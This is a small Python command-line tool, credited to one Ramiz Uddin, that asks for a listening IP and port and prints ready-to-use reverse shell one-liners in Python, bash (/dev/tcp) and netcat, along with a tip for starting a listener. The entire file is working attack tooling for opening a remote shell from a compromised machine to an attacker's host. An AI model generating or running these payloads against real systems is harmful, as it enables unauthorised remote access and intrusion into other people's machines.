# CREATED BY: RAMIZ UDDIN
import os, sys, time, subprocess

def tool_header(name):
    os.system("clear")
    print("\033[1;36m" + "="*45)
    print(f"      {name.upper()}")
    print("      CREATED BY: RAMIZ UDDIN")
    print("="*45 + "\033[0m")

def run():
    tool_header("REVERSE SHELL GENERATOR (MULTI-LANG)")
    print("\033[1;32m[*] Generate one-liner reverse shell payloads.\033[0m")
    
    ip = input("\n\033[1;33mEnter Your LHOST (Listening IP): \033[0m")
    port = input("Enter Your LPORT (Listening Port): \033[0m")
    
    print("\n\033[1;32m[+] Python (Linux):\033[0m")
    print(f'python -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")\'')
    
    print("\n\033[1;32m[+] Bash (TCP):\033[0m")
    print(f'bash -i >& /dev/tcp/{ip}/{port} 0>&1')
    
    print("\n\033[1;32m[+] Netcat (Classic):\033[0m")
    print(f'nc -e /bin/sh {ip} {port}')
    
    print("\n\033[1;33m[*] Tip: Start your listener using nc -lvnp {port}\033[0m")
    
    input("\n[Press Enter to Return]")

if __name__ == "__main__": run()
